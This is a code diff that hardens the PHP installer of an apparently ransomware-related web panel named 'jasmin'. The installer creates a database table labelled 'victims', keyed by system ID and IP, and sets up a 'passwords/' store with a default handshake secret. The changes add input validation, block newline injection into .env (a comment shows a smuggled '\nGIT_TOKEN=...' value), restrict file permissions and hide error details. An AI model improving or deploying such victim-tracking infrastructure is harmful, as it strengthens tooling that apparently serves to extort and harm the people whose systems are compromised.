@@ -24,6 +24,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $user = trim($_POST['db_user'] ?? '');
         $pass = $_POST['db_pass'] ?? '';
         $secret = trim($_POST['secret'] ?? 'jasmin@123');
+        // 主机/端口同样会拼进 DSN，且 .env 会被后续流程复用
+        if (!preg_match('/^[A-Za-z0-9._\-]{1,255}$/', $host)) {
+            throw new RuntimeException('数据库主机名格式不合法');
+        }
+        if (!preg_match('/^\d{1,5}$/', $port) || (int)$port < 1 || (int)$port > 65535) {
+            throw new RuntimeException('数据库端口不合法');
+        }
+        if (!preg_match('/^[A-Za-z0-9_\-]{1,64}$/', $secret)) {
+            throw new RuntimeException('握手密钥只能包含字母、数字、下划线、连字符');
+        }
         try {
             $dsn = "mysql:host={$host};port={$port};charset=utf8mb4";
             $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
@@ -61,14 +71,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 `created_at` timestamp DEFAULT CURRENT_TIMESTAMP,
                 INDEX(`systemid`), INDEX(`ip`)
             ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='victims'");
-            // 写.env
-            $env = "DB_HOST={$host}\nDB_PORT={$port}\nDB_NAME={$name}\nDB_USER={$user}\nDB_PASS={$pass}\nHANDSHAKE_SECRET={$secret}\n";
+            // 写 .env —— 必须剥掉换行/NUL：否则 db_pass 里塞一个 "\nGIT_TOKEN=..." 
+            // 就能向 .env 注入任意环境键。
+            $clean = function($v) { return preg_replace('/[\r\n\x00]/', '', (string)$v); };
+            $env = "DB_HOST=" . $clean($host) . "\n"
+                 . "DB_PORT=" . $clean($port) . "\n"
+                 . "DB_NAME=" . $clean($name) . "\n"
+                 . "DB_USER=" . $clean($user) . "\n"
+                 . "DB_PASS=" . $clean($pass) . "\n"
+                 . "HANDSHAKE_SECRET=" . $clean($secret) . "\n";
             file_put_contents(__DIR__ . '/.env', $env);
+            @chmod(__DIR__ . '/.env', 0640);
             $_SESSION['install_db_ok'] = true;
             header('Location: install.php?step=3');
             exit;
         } catch (PDOException $e) {
-            $error = '数据库连接失败: ' . $e->getMessage();
+            error_log('[jasmin install] DB connect failed: ' . $e->getMessage());
+            $error = '数据库连接失败，请检查主机/端口/账号/口令是否正确（详见服务端日志）';
         } catch (RuntimeException $e) {
             $error = $e->getMessage();
         }
@@ -154,7 +173,7 @@ $checks = [
     'PDO MySQL' => extension_loaded('pdo_mysql'),
     'JSON' => extension_loaded('json'),
     'mbstring' => extension_loaded('mbstring'),
-    'passwords/ 可写' => is_writable(__DIR__) || @mkdir(__DIR__.'/passwords'),
+    'passwords/ 可写' => is_writable(__DIR__ . '/passwords') || @mkdir(__DIR__ . '/passwords'),
 ];
 $all_ok = !in_array(false, $checks);
 foreach($checks as $name=>$ok): ?>
